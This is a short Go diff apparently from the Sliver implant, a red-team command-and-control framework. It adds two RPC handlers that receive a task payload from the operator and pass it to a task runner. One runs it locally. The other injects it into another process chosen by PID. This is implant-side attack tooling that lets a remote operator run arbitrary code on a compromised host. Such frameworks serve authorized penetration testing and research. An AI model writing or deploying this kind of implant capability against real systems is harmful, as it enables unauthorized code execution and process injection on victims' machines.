@@ -17,6 +17,7 @@ import (
 	pb "sliver/protobuf/sliver"
 	"sliver/sliver/procdump"
 	"sliver/sliver/ps"
+	"sliver/sliver/taskrunner"
 
 	"github.com/golang/protobuf/proto"
 )
@@ -305,6 +306,33 @@ func dumpHandler(data []byte, resp RPCResponse) {
 	}
 	data, err = proto.Marshal(dumpResp)
 	resp(data, err)
+}
+
+func taskHandler(data []byte, resp RPCResponse) {
+	task := &pb.Task{}
+	err := proto.Unmarshal(data, task)
+	if err != nil {
+		// {{if .Debug}}
+		log.Printf("error decoding message: %v", err)
+		// {{end}}
+		return
+	}
+
+	err = taskrunner.LocalTask(task.Data)
+	resp([]byte{}, err)
+}
+
+func remoteTaskHandler(data []byte, resp RPCResponse) {
+	remoteTask := &pb.RemoteTask{}
+	err := proto.Unmarshal(data, remoteTask)
+	if err != nil {
+		// {{if .Debug}}
+		log.Printf("error decoding message: %v", err)
+		// {{end}}
+		return
+	}
+	err = taskrunner.RemoteTask(int(remoteTask.Pid), remoteTask.Data)
+	resp([]byte{}, err)
 }
 
 // ---------------- Data Encoders ----------------
